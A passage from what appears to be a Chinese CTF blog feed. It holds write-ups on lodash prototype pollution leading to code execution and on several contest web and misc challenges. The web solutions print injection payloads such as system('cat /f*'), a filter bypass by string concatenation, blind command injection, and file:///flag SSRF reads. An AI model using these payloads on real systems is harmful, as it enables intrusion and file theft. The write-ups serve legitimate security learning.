class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// ...</span><br><span class="line">const lodash = require(&#x27;lodash&#x27;)</span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123; </span><br><span class="line">// define the template engine</span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        if (err) return callback(new Error(err))</span><br><span class="line">        let compiled = lodash.template(content)</span><br><span class="line">        let rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        return callback(null, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">//...</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    let data = req.session.data || &#123;language: [], category: []&#125;</span><br><span class="line">    if (req.method == &#x27;POST&#x27;) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(&#x27;index&#x27;, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：</p><ol><li><code>lodash.template</code> 一个简单的模板引擎</li><li><code>lodash.merge</code> 函数或对象的合并</li></ol><p>其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p><p>而这里的<code>lodash.merge</code>操作实际上就存在原型链污染漏洞。</p><p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的<code>lodash.template</code>中。我们看到<code>lodash.template</code>的代码：<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Use a sourceURL for easier debugging.</span><br><span class="line">var sourceURL = &#x27;sourceURL&#x27; in options ? &#x27;//# sourceURL=&#x27; + options.sourceURL + &#x27;\n&#x27; : &#x27;&#x27;;</span><br><span class="line">// ...</span><br><span class="line">var result = attempt(function() &#123;</span><br><span class="line">  return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)</span><br><span class="line">  .apply(undefined, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。</p><p>但因为原型链污染，我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。</p><p>我将带有<code>__proto__</code>的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/85fae11e-100b-41aa-9316-de81b93d0036.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/85fae11e-100b-41aa-9316-de81b93d0036.c6d39683853f.png" alt="image.png"></a></p><p>可见，我们代码执行成功，返回了id命令的结果。</p><p>整个案例我觉得是一个非常经典的原型链污染漏洞教程，代码不多，逻辑不复杂，没有刻意创造漏洞，真正触发漏洞的代码在库中。</p><p>我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。</p>]]></content>
    
    
    <summary type="html">🥧深入理解 JavaScript Prototype 污染攻击</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>第八届强网杯青少赛wp</title>
    <link href="https://m3x1.cn/posts/2cd096fe.html"/>
    <id>https://m3x1.cn/posts/2cd096fe.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-07T10:47:00.564Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1>第八届强网杯青少赛wp</h1><h2 id="misc">misc</h2><h4 id="签到漫画">签到漫画</h4><blockquote><p>每个漫画的最后一张都是二维码的一部分，全部保存，然后拼在一起，扫描二维码出flag.。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155544679.png" alt="image-20241124155544679"></p><blockquote><p>flag{youthful_and_upward}</p></blockquote><h4 id="whitepic">whitepic</h4><blockquote><p>考点：gif图像</p></blockquote><blockquote><p>下载文件，没有后缀名，能用010editor打开</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155848111.png" alt="image-20241124155848111"></p><blockquote><p>根据文件头GIF89a，可以看出是个gif文件。直接使用gifsplitter分离帧数，在其中一帧找到flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160011013.png" alt="image-20241124160011013"></p><h4 id="问卷">问卷</h4><blockquote><p>你懂的</p></blockquote><h2 id="web">web</h2><h4 id="ezGetFlag">ezGetFlag</h4><blockquote><p>考点：http请求方式</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160230507.png" alt=""></p><blockquote><p>点击10次会出现提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160307890.png" alt="image-20241124160307890"></p><blockquote><p>直接抓包，修改请求方式，把GET改成POST就行了。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160446998.png" alt="image-20241124160446998"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160500182.png" alt="image-20241124160500182"></p><blockquote><p>flag{4efb5300-7885-40a9-bf2a-31bbd8ebef86}</p></blockquote><h4 id="ezFindShell">ezFindShell</h4><blockquote><p>考点：代码审计</p></blockquote><p>这题是赛后复现，所以可能不全</p><p>首先拿到一堆php文件，用seay审计</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223303421.png" alt="image-20241130223303421"></p><p>非常相似，当时比赛没找到漏洞，现在复现，全局搜索一下post</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223557289.png" alt="image-20241130223557289"></p><p>发现可用漏洞</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223624296.png" alt="image-20241130223624296"></p><p>array_filter() 函数用回调函数过滤数组中的元素。</p><p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p><p>将代码进行base64编码传上去应该就可利用该漏洞。</p>]]></content>
    
    
    <summary type="html">🥧第八届强网杯青少赛wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>hubu新星杯实践能力赛模拟赛web-wp</title>
    <link href="https://m3x1.cn/posts/98034dd5.html"/>
    <id>https://m3x1.cn/posts/98034dd5.html</id>
    <published>2024-11-22T16:00:00.000Z</published>
    <updated>2024-12-02T09:07:20.567Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ez-eval">ez_eval</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$hubu = $_GET[&#x27;hubu&#x27;];</span><br><span class="line"></span><br><span class="line">eval($hubu);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><blockquote><p>先进行代码审计，GET传参hubu，并执行命令，没有任何绕过，放开手脚去做</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hubu=system(&#x27;cat /f*&#x27;);      #直接rce</span><br></pre></td></tr></table></figure><h4 id="rce-level1">rce_level1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c  = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>代码审计，发现过滤了关键字flag,system,php。</p><p>使用拼接绕过构造payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=(&#x27;sys&#x27;.&#x27;tem&#x27;)(ls);    #发现目录下没有flag文件</span><br><span class="line">?c=(&#x27;sys&#x27;.&#x27;tem&#x27;)(cat /f*);   #发现回显空白</span><br></pre></td></tr></table></figure><blockquote><p>不在文件夹里，那可能是在phpinfo里</p></blockquote><blockquote><p>payload：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phpinfo();</span><br></pre></td></tr></table></figure><blockquote><p>没回显…根据代码的过滤可以知道，应该只过滤了三个关键字，可其实并不只过滤了这三个关键字。</p><p>经过测试，发现有隐藏过滤，比如关键字php，和一些字符如反斜杠\</p><p>最后的payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=(&#x27;ph&#x27;.&#x27;pinfo&#x27;)();</span><br></pre></td></tr></table></figure><blockquote><p>在页面中找到flag。</p></blockquote><h4 id="ez-LFI">ez_LFI</h4><blockquote><p>考点：伪协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161059701.png" alt="image-20241124161059701"></p><blockquote><p>先随便传一个，/?url=111</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161148073.png" alt="image-20241124161148073"></p><blockquote><p>代码审计，根据网上查询的parse_url()函数的资料显示：</p><p>解析 URL，返回其组成部分，如下：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;</span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>所以必须在传入的url参数中让[host]是localhost。</p><p>然后再用file协议读取flag。</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=file://localhost/flag</span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{22290581-9558-4405-9c01-368dc660bf6a}</p></blockquote><h2 id="Misc">Misc</h2><h4 id="Cute-Rabbit">Cute Rabbit</h4><blockquote><p>考点：rabbit编码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VTJGc2RHVmtYMS91RnhkczF5SU1jdit1K3o0NzFCcDR2aXcrVkNNaS9TU1QyZU5EMFUvSQo=</span><br></pre></td></tr></table></figure><blockquote><p>签到题，根据题目提示，是rabbit编码，密文末尾的=表示可能是base64，所以是</p><p>base64 -&gt; rabbit</p><p>HUBUCTF{S0_&lt;u73_R4b6it}</p></blockquote><h4 id="Docker-Forensic">Docker Forensic</h4><blockquote><p>考点：docker的使用</p></blockquote><blockquote><p>根据题目提示，先拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull crpi-i24jskxbbxvfxlzp.cn-hangzhou.personal.cr.aliyuncs.com/st4rry/aliyun:ez_docker_forensic</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124162645328.png" alt="image-20241124162645328"></p><blockquote><p>将镜像压缩到本地</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124164537663.png" alt="image-20241124164537663"></p><blockquote><p>将文件解压到一个目录下，然后切换到该目录。在该目录下有个sha256文件夹，把里面的文件解压</p><p>在tmp中找到password</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165519193.png" alt="image-20241124165519193"></p><blockquote><p>退级，在解压后的一个文件夹里找到flag.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165719701.png" alt="image-20241124165719701"></p><blockquote><p>使用了加盐算法，密钥就是上面的password,进行解密</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171222266.png" alt="image-20241124171222266"></p><blockquote><p>HUBUCTF{1_L0v3_D0ck3r_F0r3ns1c_A}</p></blockquote><h4 id="SpeedMath">SpeedMath</h4><blockquote><p>考点：nc连接，python脚本</p></blockquote><blockquote><p>先用nc连接</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171410644.png" alt="image-20241124171410644"></p><blockquote><p>发现会出现算数题目，但是给你输入的时间很短，所以几乎不可能手工做，直接问AI写脚本</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def solve_arithmetic_expression(expression):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    解析并计算算术表达式的结果。</span><br><span class="line">    这里假设表达式只包含整数和基本的加减乘除运算。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        # 使用eval计算表达式的结果，但注意eval的安全性问题</span><br><span class="line">        # 在实际应用中，应该使用更安全的解析方法</span><br><span class="line">        result = eval(expression)</span><br><span class="line">        return result</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error evaluating expression &#x27;&#123;expression&#125;&#x27;: &#123;e&#125;&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">def nc_connection(host, port):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    使用Netcat连接到服务器，并自动解答算术题。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            # 读取服务器发送的数据</span><br><span class="line">            data = s.recv(1024).decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line">            </span><br><span class="line">            if not data:</span><br><span class="line">                # 如果没有接收到数据，可能是连接已经关闭</span><br><span class="line">                break</span><br><span class="line">            </span><br><span class="line">            print(f&quot;Received: &#123;data&#125;&quot;)</span><br><span class="line">            </span><br><span class="line">            # 使用正则表达式匹配算术题目</span><br><span class="line">            match = re.match(r&#x27;Question \d+: (\d+) ([+\-*/]) (\d+) =&#x27;, data)</span><br><span class="line">            if match:</span><br><span class="line">                num1 = int(match.group(1))</span><br><span class="line">                operator = match.group(2)</span><br><span class="line">                num2 = int(match.group(3))</span><br><span class="line">                </span><br><span class="line">                # 构造算术表达式</span><br><span class="line">                expression = f&quot;&#123;num1&#125; &#123;operator&#125; &#123;num2&#125;&quot;</span><br><span class="line">                </span><br><span class="line">                # 计算正确答案</span><br><span class="line">                correct_answer = solve_arithmetic_expression(expression)</span><br><span class="line">                </span><br><span class="line">                if correct_answer is not None:</span><br><span class="line">                    # 将答案发送回服务器（假设服务器期望的是整数答案）</span><br><span class="line">                    s.sendall(f&quot;&#123;correct_answer&#125;\n&quot;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">                else:</span><br><span class="line">                    # 如果无法计算表达式，则退出循环</span><br><span class="line">                    print(&quot;Failed to solve expression.&quot;)</span><br><span class="line">                    break</span><br><span class="line">            else:</span><br><span class="line">                # 如果不是算术题目，可能是其他信息或结束信息</span><br><span class="line">                # 这里假设服务器在发送完所有题目后会发送一个非算术题目的消息</span><br><span class="line">                print(&quot;Received non-arithmetic message, possibly final message.&quot;)</span><br><span class="line">                print(f&quot;Final message: &#123;data&#125;&quot;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"># 使用示例</span><br><span class="line">nc_connection(&#x27;challenge.hubuctf.cn&#x27;, 32478)  # 替换为你的服务器主机名和端口号</span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{72e53365-bf9c-48db-8327-83b9c9269e7d}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧hubu新星杯实践能力赛模拟赛web-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>华科第一届网络安全挑战赛wp</title>
    <link href="https://m3x1.cn/posts/4971d2f4.html"/>
    <id>https://m3x1.cn/posts/4971d2f4.html</id>
    <published>2024-11-18T16:00:00.000Z</published>
    <updated>2024-12-02T09:05:46.472Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1>华科第一届网络安全挑战赛wp</h1><h2 id="web">web</h2><h4 id="secure-shell">secure_shell</h4><blockquote><p>考点：exec()无回显</p></blockquote><blockquote><p>对于这类题有个很简单的方法，直接将flag写进文件，然后路径读取就行</p></blockquote><blockquote><p>先测试一下能不能执行 cmd=1;sleep 4</p><p>发现反应了4秒，能执行</p><p>然后直接 cat /f* &gt; 1.txt</p><p>最后访问/1.txt路径就行</p></blockquote><h4 id="pyssrf">pyssrf</h4><blockquote><p>考点：ssrf漏洞</p></blockquote><blockquote><p>打开有个提示 /get?site=</p><p>直接file读取flag</p><p>/get?site=file:///flag</p><p>碎碎念：以为很难。。。试了半天。。。。</p></blockquote><h2 id="misc">misc</h2><h4 id="一闪一闪亮晶晶">一闪一闪亮晶晶</h4><blockquote><p>考点：凯撒与base64结合，starry语言</p></blockquote><blockquote><p>根据提示，“凯撒大帝想学习一下Starry语言，你能帮帮他么吗”，一定跟凯撒密码和starry语言有关。</p><p>下载文件，是一串重复度非常高的字符串</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDBhJDBsJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLxprJDBhJDBhJDBsJDBrJDBhJDBsLjBsJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzprJDthMjBhJDBhLzBhJDBhJDBhDjthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtLLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJBphLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphDjBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBLJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJD4hJDBhJDBhMjBsJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjphLzBhJDBhJDBvJBphJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhDjBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBLJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJBphJDBhJDtrJDBhMjBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhDjBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLhphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJD4hJDBhJD4hLzBhJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrDjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphLzBhJDBhJDBvJDBhJDBsJDBhJDBhJDBLLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLhphLzBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhDjBsLjBsJDBhJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDpLJDBhJDBhJDtrLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJBphJDthJDphJDBhJDBsLjBsJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhDjBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhLzphJDBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLhphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhDjBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBLJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJBphLzphJDBhJDBhMjBhJDBhJDBvJDBhJDBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthDjBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBsJDBhJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJBphJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsDjBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBLJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhMjBhJDBhMjBsJDBhMjBhJDBhLxphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhDjBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBLJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhL